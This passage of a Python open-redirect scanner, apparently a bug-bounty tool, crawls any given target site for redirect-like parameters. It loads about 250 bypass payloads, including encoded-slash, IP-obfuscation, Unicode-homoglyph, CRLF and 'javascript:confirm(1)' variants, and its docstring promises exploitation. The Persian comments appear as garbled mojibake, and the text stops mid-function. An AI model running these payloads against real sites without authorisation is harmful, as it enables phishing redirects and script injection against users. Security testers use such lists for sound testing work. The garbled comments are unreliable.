#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
üîç Professional Open Redirect Vulnerability Scanner
ÿ®ÿ±ŸÜÿßŸÖŸá ÿ≠ÿ±ŸÅŸá‚Äåÿß€å Ÿæ€åÿØÿß ⁄©ÿ±ÿØŸÜ Ÿà ÿß⁄©ÿ≥ŸæŸÑŸà€åÿ™ ÿ®ÿß⁄Ø Open Redirect

ŸÜŸà€åÿ≥ŸÜÿØŸá: Security Research Team
ŸÜÿ≥ÿÆŸá: 2.0 Professional

Ÿà€å⁄ò⁄Ø€å‚ÄåŸáÿß:
‚úÖ ÿÆÿ≤ÿ¥ ÿπŸÖ€åŸÇ ÿ®ÿß ÿ±ŸÜÿØÿ± JavaScript
‚úÖ ÿ™ÿ≠ŸÑ€åŸÑ Ÿæ€åÿ¥ÿ±ŸÅÿ™Ÿá ŸÅÿß€åŸÑ‚ÄåŸáÿß€å JS
‚úÖ ÿ™ÿ¥ÿÆ€åÿµ DOM-based redirect  
‚úÖ Ÿæÿ¥ÿ™€åÿ®ÿßŸÜ€å ⁄©ÿßŸÖŸÑ Web3
‚úÖ ÿ™ÿ≤ÿ±€åŸÇ payload ŸáŸàÿ¥ŸÖŸÜÿØ ÿ®ÿ± ÿßÿ≥ÿßÿ≥ context
‚úÖ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿÆŸàÿØ⁄©ÿßÿ± PoC
‚úÖ ⁄Øÿ≤ÿßÿ±ÿ¥‚ÄåÿØŸá€å ÿ≠ÿ±ŸÅŸá‚Äåÿß€å

ÿßÿ≥ÿ™ŸÅÿßÿØŸá:
python3 open_redirect_pro.py https://target.com
"""

import asyncio
import aiohttp
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import base64
import random
import string
import os
import sys
import tempfile
import csv

# Try importing optional dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("‚ö†Ô∏è  Selenium not available - screenshots will be disabled")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("‚ö†Ô∏è  BeautifulSoup not available - using basic HTML parsing")

try:
    import esprima
    import jsbeautifier
    JS_ANALYSIS_AVAILABLE = True
except ImportError:
    JS_ANALYSIS_AVAILABLE = False
    print("‚ö†Ô∏è  JavaScript analysis libraries not available - using regex only")


@dataclass
class Parameter:
    """Ÿæÿßÿ±ÿßŸÖÿ™ÿ± ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá"""
    name: str
    value: str
    source: str  # 'url', 'form', 'javascript', 'headers', 'web3'
    context: str  # 'query', 'fragment', 'form', 'js_variable', 'web3_config'
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False
    confidence: float = 0.0


@dataclass
class Vulnerability:
    """ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å ⁄©ÿ¥ŸÅ ÿ¥ÿØŸá"""
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"
    remediation: str = ""


class OpenRedirectPro:
    """ÿßÿ≥⁄©ŸÜÿ± ÿ≠ÿ±ŸÅŸá‚Äåÿß€å Open Redirect"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # ÿ∞ÿÆ€åÿ±Ÿá‚Äåÿ≥ÿßÿ≤€å
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # ŸÖÿØ€åÿ±€åÿ™ session
        self.session: Optional[aiohttp.ClientSession] = None
        self.driver: Optional[webdriver.Chrome] = None
        
        # ÿ™ŸÜÿ∏€åŸÖÿßÿ™
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        # ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å logging
        self.setup_logging()
        
        # ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å payloadŸáÿß
        self.payloads = self.load_all_payloads()
        
        # ÿßŸÑ⁄ØŸàŸáÿß€å redirect
        self.redirect_patterns = [
            r'redirect', r'url', r'next', r'return', r'goto', r'target',
            r'destination', r'continue', r'forward', r'redir', r'location',
            r'site', r'link', r'href', r'returnurl', r'returnto', r'back',
            r'callback', r'success', r'failure', r'done', r'exit', r'referrer'
        ]
        
        # ÿßŸÑ⁄ØŸàŸáÿß€å Web3
        self.web3_patterns = [
            r'web3', r'ethereum', r'metamask', r'wallet', r'dapp',
            r'blockchain', r'crypto', r'nft', r'defi', r'contract'
        ]
    
    def setup_logging(self):
        """ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å logging"""
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler('open_redirect_scan.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_all_payloads(self) -> List[str]:
        """ÿ®ÿßÿ±⁄Øÿ∞ÿßÿ±€å ÿ™ŸÖÿßŸÖ payloadŸáÿß€å ÿßÿÆÿ™ÿµÿßÿµ€å ÿ¥ŸÖÿß"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\\/\\/google.com/",
            "/\\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "„Ä±google.com",
            "„Äµgoogle.com",
            "„Çùgoogle.com",
            "„Éºgoogle.com",
            "ÔΩ∞google.com",
            "/„Ä±google.com",
            "/„Äµgoogle.com",
            "/„Çùgoogle.com",
            "/„Éºgoogle.com",
            "/ÔΩ∞google.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "///google.com/%2e%2e",
            "///google.com/%2e%2e%2f",
            "///google.com/%2f%2e%2e",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "//https:///google.com/%2e%2e",
            "//https://google.com/%2e%2e%2f",
            "/&lt;&gt;//google.com",
            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/?url=/\\/google.com&next=/\\/google.com&redirect=/\\/google.com&redirect_uri=/\\/google.com",
            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\\/\\/google.com/",
            "/google.com/%2f%2e%2e",
            "/http://google.com",
            "/http:/google.com",
            "/https:/%5cgoogle.com/",
            "/https://%5cgoogle.com",
            "/https://google.com/%2e%2e",
            "/https://google.com/%2f%2e%2e",
            "/https:google.com",
            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
            "//%2fxgoogle.com",
            "//localdomain%E3%80%82pw",
            "http://0xd83ad6ce",
            "http://3627734734",
            "http://472.314.470.462",
            "http://0330.072.0326.0316",
            "http://00330.00072.0000326.00000316",
            "http://0xd8.072.54990",
            "http://0xd8.3856078",
            "http://00330.3856078",
            "http://00330.0x3a.54990",
            "http:0xd8.0x3a.0xd6.0xce",
            "http:0xd83ad6ce",
            "http:3627734734",
            "http:472.314.470.462",
            "http:0330.072.0326.0316",
            "http:00330.00072.0000326.00000316",
            "http:[::216.58.214.206]",
            "http:[::ffff:216.58.214.206]",
            "http:0xd8.072.54990",
            "http:0xd8.3856078",
            "http:00330.3856078",
            "http:00330.0x3a.54990",
            "&lt;&gt;//google.com",
            "http://.google.com",
            "https://google.com/https://google.com/",
            "http://google.com\tgoogle.com/",
            "//google.com\tgoogle.com/",
            "http://google.com%2f%2f.google.com/",
            "http://google.com%5c%5c.google.com/",
            "http://google.com%3F.google.com/",
            "http://google.com%23.google.com/",
            "http://google.com:80%40google.com/",
            "http://google.com%2egoogle.com/",
            "/„Ä±‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "„Ä±‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "$2f%2f216.58.214.206%2f%2f",
            "$2f%2f3627734734%2f%2f",
            "$2f%2fgoogle.com",
            "$2f%2fgoogle.com%2f%2f",
            "%01https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////216.58.214.206",
            "///216.58.214.206",
            "//216.58.214.206",
            "/\\216.58.214.206",
            "/216.58.214.206",
            "216.58.214.206",
            "%2f$2f216.58.214.206",
            "%2f$2f3627734734",
            "%2f$2fgoogle.com",
            "%2f216.58.214.206",
            "%2f216.58.214.206//",
            "%2f216.58.214.206%2f%2f",
            "//%2f%2fgoogle.com",
            "/%2f%2f‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%2f%2f‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "%2f3627734734",
            "%2f3627734734//",
            "%2f3627734734%2f%2f",
            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
            "%2fgoogle.com",
            "%2fgoogle.com//",
            "\\\\google.com",
            "%2fgoogle.com%2f%2f",
            "////3627734734",
            "///3627734734",
            "//3627734734",
            "/\\3627734734",
            "/3627734734",
            "//%2F/google.com",
            "/%0D/google.com",
            "/%2F/google.com",
            "/%5Cgoogle.com",
            "/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "////%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/\\google%252ecom",
            "google%252ecom",
            "../google.com",
            "//google%00.com",
            "////google.com",
            "//\\/google.com/",
            "//\\google.com",
            "/<>//google.com",
            "/\\/\\/google.com/",
            "/\\/google.com",
            "/\\google.com",
            "/google.com",
            "//google.com/%2E%2E",
            "//google.com/%2F..",
            "/google.com/%2F..",
            "//google.com//%2F%2E%2E",
            "google.com/.jpg",
            "http:%0a%0dgoogle.com",
            "http:%0a%0d‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:/\\/\\google.com",
            "http:/google.com",
            "http:google.com",
            "/http:/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http://.‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "http:‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https://%09/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https://%0a%0dgoogle.com",
            "https://%0a%0d‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https%3a%2f%2fgoogle.com%2f",
            "https:/%5cgoogle.com/",
            "/https:/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "/https://%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "https:/%5c‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
            "https:/\\google.com",
            "https://google%E3%80%82com",
            "//https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "https:‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//https:///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "//https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "/https:///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "/https://‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//‚ìÅùê®ùó∞ ùïù‚ÖÜùì∏‚ìú‚Çê‚Ñπ‚ìÉ%00ÔΩ°Ôº∞‚ì¶",
            "//‚ìÅùê®ùó∞ ùïù‚ÖÜùì∏‚ìú‚Çê‚Ñπ‚ìÉ%E3%80%82pw",
            "/.‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "/////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "//\\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ//",
            "/\\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "<>//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ",
            "\\/\\/‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2e%2e%2f",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f..",
            "////‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "///‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            "//‚ìñùëúùóºùïòùïùùëí.ùëêùëúùìÇ/%2f%2e%2e",
            # Web3 specific payloads
            "//metamask.io",
            "//wallet.connect",
            "//uniswap.org",
            "//opensea.io",
            "web3://contract.eth",
            "ipfs://QmHash",
            "ens://vitalik.eth"
        ]
    
    async def init_session(self):
        """ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å HTTP session"""
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ssl=False)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
        )
    
    def init_driver(self):
        """ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å Chrome WebDriver"""
        if not SELENIUM_AVAILABLE:
            self.logger.warning("Selenium not available - screenshots disabled")
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--ignore-certificate-errors')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.logger.info("Chrome WebDriver initialized")
        except Exception as e:
            self.logger.warning(f"Chrome WebDriver failed: {e}")
            self.driver = None
    
    async def crawl_website(self) -> Set[str]:
        """ÿÆÿ≤ÿ¥ ÿπŸÖ€åŸÇ Ÿàÿ®‚Äåÿ≥ÿß€åÿ™"""
        self.logger.info(f"üï∑Ô∏è Starting deep crawl of {self.target_url}")
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:20]  # Batch processing
            urls_to_crawl.clear()
            
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_single_page(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            self.logger.info(f"Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
        
        self.discovered_urls = crawled_urls
        return crawled_urls
    
    async def crawl_single_page(self, url: str) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """ÿÆÿ≤ÿ¥ €å⁄© ÿµŸÅÿ≠Ÿá"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                # Parse HTML
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_bs4(soup, url)
                    params = self.extract_params_bs4(soup, url)
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_params_regex(content, url)
                
                # URL parameters
                params.extend(self.extract_url_parameters(url))
                
                # JavaScript analysis
                js_params = await self.analyze_javascript_content(content, url)
                params.extend(js_params)
                
                # Web3 analysis
                web3_params = self.analyze_web3_patterns(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.debug(f"Error crawling {url}: {e}")
            return None
    
    def extract_urls_bs4(self, soup, base_url: str) -> Set[str]:
        """ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ URL ÿ®ÿß BeautifulSoup"""
        urls = set()
        for link in soup.find_all(['a', 'link'], href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url):
                urls.add(full_url)
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
        """ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ URL ÿ®ÿß regex"""
        urls = set()
        url_patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']'
        ]
        
        for pattern in url_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_params_bs4(self, soup, url: str) -> List[Parameter]:
        """ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß ÿ®ÿß BeautifulSoup"""
        params = []
        
        # Form parameters
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=form_url,
                        method=method,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_params_regex(self, content: str, url: str) -> List[Parameter]:
        """ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß ÿ®ÿß regex"""
        params = []
        
        # Form patterns
        form_patterns = [
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\']'
        ]
        
        for pattern in form_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) == 2:
                    name, value = match if 'name=' in pattern.split('value=')[0] else (match[1], match[0])
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å URL"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name, param_values in query_params.items():
            for value in param_values:
                is_redirect = self.is_redirect_parameter(param_name, value)
                confidence = self.calculate_confidence(param_name, value, 'query')
                
                params.append(Parameter(
                    name=param_name,
                    value=value,
                    source='url',
                    context='query',
                    url=url,
                    is_redirect_related=is_redirect,
                    confidence=confidence
                ))
        
        # Fragment parameters
        if parsed.fragment:
            if '=' in parsed.fragment:
                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
                for param_name, param_values in fragment_params.items():
                    for value in param_values:
                        is_redirect = self.is_redirect_parameter(param_name, value)
                        confidence = self.calculate_confidence(param_name, value, 'fragment')
                        
                        params.append(Parameter(
                            name=param_name,
                            value=value,
                            source='url',
                            context='fragment',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    async def analyze_javascript_content(self, content: str, url: str) -> List[Parameter]:
        """ÿ™ÿ≠ŸÑ€åŸÑ ŸÖÿ≠ÿ™Ÿàÿß€å JavaScript"""
        params = []
        
        # Extract JavaScript code
        js_blocks = []
        
        # Inline JavaScript
        if BS4_AVAILABLE:
            soup = BeautifulSoup(content, 'html.parser')
            for script in soup.find_all('script'):
                if script.string:
                    js_blocks.append(script.string)
                elif script.get('src'):
                    js_url = urljoin(url, script['src'])
                    if self.is_same_domain(js_url):
                        self.js_files.add(js_url)
                        js_content = await self.fetch_js_file(js_url)
                        if js_content:
                            js_blocks.append(js_content)
        else:
            # Regex-based extraction
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)
            js_blocks.extend(scripts)
        
        # Analyze each JavaScript block
        for js_content in js_blocks:
            js_params = self.analyze_javascript_code(js_content, url)
            params.extend(js_params)
        
        return params
    
    async def fetch_js_file(self, js_url: str) -> Optional[str]:
        """ÿØÿ±€åÿßŸÅÿ™ ŸÅÿß€åŸÑ JavaScript"""
        try:
            async with self.session.get(js_url) as response:
                return await response.text()
        except:
            return None
    
    def analyze_javascript_code(self, js_content: str, source_url: str) -> List[Parameter]:
        """ÿ™ÿ≠ŸÑ€åŸÑ ⁄©ÿØ JavaScript"""
        params = []
        
        # Beautify if possible
        if JS_ANALYSIS_AVAILABLE:
            try:
                js_content = jsbeautifier.beautify(js_content)
            except:
                pass
        
        # JavaScript parameter patterns
        js_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
            r'location\.assign\(["\']?([^"\';\)]+)',
            r'location\.replace\(["\']?([^"\';\)]+)',
            r'window\.open\(["\']?([^"\';\,\)]+)',
            r'new\s+URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
            r'localStorage\.getItem\(["\']([^"\']+)["\']',
            r'sessionStorage\.getItem\(["\']([^"\']+)["\']',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
        ]
        
        lines = js_content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern in js_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    groups = match.groups()
                    if groups:
                        if len(groups) == 1:
                            param_name = f"js_param_{line_num}"
                            param_value = groups[0]
                        else:
                            param_name = groups[0] if groups[0] else f"js_param_{line_num}"
                            param_value = groups[1] if len(groups) > 1 else groups[0]
                        
                        is_redirect = self.is_redirect_parameter(param_name, param_value)
                        confidence = self.calculate_confidence(param_name, param_value, 'javascript')
                        
                        # Boost confidence for redirect patterns
                        if any(sink in line.lower() for sink in ['location.href', 'window.location']):
                            is_redirect = True
                            confidence += 0.3
                        
                        params.append(Parameter(
                            name=param_name.strip('"\''),
                            value=param_value.strip('"\''),
                            source='javascript',
                            context='js_variable',
                            url=source_url,
                            is_redirect_related=is_redirect,
                            confidence=min(confidence, 1.0)
                        ))
        
        return params
    
    def analyze_web3_patterns(self, content: str, url: str) -> List[Parameter]:
        """ÿ™ÿ≠ŸÑ€åŸÑ ÿßŸÑ⁄ØŸàŸáÿß€å Web3"""
        params = []
        
        # Check if Web3 application
        if not any(pattern in content.lower() for pattern in self.web3_patterns):
            return params
        
        self.logger.info(f"üåê Detected Web3 application at {url}")
        
        # Web3 parameter patterns
        web3_patterns = [
            r'contract\s*:\s*["\']([^"\']+)["\']',
            r'address\s*:\s*["\']([^"\']+)["\']',
            r'chainId\s*:\s*["\']?([^"\']+)["\']?',
            r'provider\s*:\s*["\']([^"\']+)["\']',
            r'wallet\s*:\s*["\']([^"\']+)["\']',
            r'network\s*:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in web3_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                param_name = f"web3_{pattern.split(':')[0].strip()}"
                param_value = match
                
                params.append(Parameter(
                    name=param_name,
                    value=param_value,
                    source='web3',
                    context='web3_config',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.7
                ))
        
        return params
    
    def is_same_domain(self, url: str) -> bool:
        """ÿ®ÿ±ÿ±ÿ≥€å ÿ™ÿπŸÑŸÇ URL ÿ®Ÿá ŸáŸÖÿßŸÜ domain"""
        try:
            parsed = urlparse(url)
            target_domain = parsed.netloc.lower()
            base_domain = self.base_domain.lower()
            
            return (target_domain == base_domain or 
                   target_domain.endswith(f'.{base_domain}') or
                   (target_domain.startswith('www.') and target_domain[4:] == base_domain))
        except:
            return False
    
    def is_redirect_parameter(self, param_name: str, param_value: str = "") -> bool:
        """ÿ™ÿ¥ÿÆ€åÿµ Ÿæÿßÿ±ÿßŸÖÿ™ÿ± redirect"""
        param_lower = param_name.lower()
